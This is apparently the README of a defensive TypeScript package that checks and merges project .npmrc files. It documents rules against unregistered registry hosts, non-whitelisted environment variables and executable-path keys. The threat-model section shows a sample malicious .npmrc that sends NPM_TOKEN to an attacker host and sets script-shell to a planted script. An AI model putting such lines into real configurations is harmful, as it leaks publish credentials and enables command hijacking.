# 安全 .npmrc 配置合并判定包

零依赖 TypeScript 包，供包管理器封装在读取**项目级 `.npmrc`** 时做安全校验与合并，
防止恶意项目把 registry 指向攻击者主机、借环境变量展开外发发布令牌，或通过
`script-shell`、`git` 等键劫持命令执行。

## 威胁模型

项目目录可被攻击者控制，典型恶意 `.npmrc`：

```ini
registry=https://evil.attacker.example/
//evil.attacker.example/:_authToken=${NPM_TOKEN}
script-shell=/tmp/pwn/evil-shell.sh
```

信任边界是**调用方**：只有调用方预先登记的 registry 主机、预先放行的环境变量
可以出现在最终配置里。

## 判定规则

1. **认证行主机一致性**：`//host/:_authToken`（以及 `//host/:_password` 等
   按主机凭据键）的主机必须与 `registries` 登记的某个 registry 主机一致，否则
   报 `unregistered-auth-host`，杜绝令牌外发。
2. **环境变量白名单**：值中的 `${VAR}` / `$VAR` 只能引用 `allowedEnvVars`
   中的变量，否则报 `non-whitelisted-env-var`；含变量的认证/registry 条目
   同样只能指向登记主机（白名单变量发往未登记主机依然拒绝）。
3. **可执行路径键拒绝**：`script-shell`、`git` 一律报
   `forbidden-executable-key`，列表见 `FORBIDDEN_EXECUTABLE_KEYS`。
4. **registry 主机登记**：顶层 `registry` 与 `@scope:registry` 指向未登记
   主机时报 `unregistered-registry-host`；URL 无法解析报 `invalid-url`。

合并时只要存在任意问题，项目配置**整体丢弃**，只返回调用方的基础配置。

## 用法

```ts
import { mergeNpmrc, validateNpmrc } from './index.js';

const options = {
  registries: ['https://registry.npmjs.org/'],
  allowedEnvVars: ['NPM_TOKEN'],
};

// 只判定
const result = validateNpmrc(projectNpmrcText, options);
if (!result.ok) {
  console.error(result.issues);
}

// 判定 + 安全合并（白名单变量才会被展开）
const merged = mergeNpmrc(projectNpmrcText, baseConfig, {
  ...options,
  env: process.env,
});
```

问题对象结构：

```ts
interface NpmrcIssue {
  code:
    | 'forbidden-executable-key'
    | 'unregistered-auth-host'
    | 'unregistered-registry-host'
    | 'non-whitelisted-env-var'
    | 'invalid-url'
    | 'malformed-line';
  line: number;
  key: string;
  message: string;
  detail?: { host?: string; variable?: string };
}
```

## 导出

- `parseNpmrc(text)`：解析为带行号的键值条目，忽略注释与 section 头。
- `validateNpmrc(text, options)`：执行全部安全规则，返回 `ok / entries / issues`。
- `mergeNpmrc(text, base, options)`：安全合并，失败时只返回 `base` 的副本。
- 工具：`FORBIDDEN_EXECUTABLE_KEYS`、`buildRegisteredHosts`、`parseAuthKey`、
  `isRegistryKey`、`extractEnvVars`、`expandValue`、`hostFromUrl`。

## 测试

```sh
npm test
# 等价于：node --experimental-strip-types --test
```

`test/fixtures/` 内含外发令牌、非白名单变量、`script-shell`/`git`、
作用域未登记主机与合法配置五类样例，`test/safe-npmrc.test.ts` 覆盖对应判定与
合并后令牌不泄漏的断言。
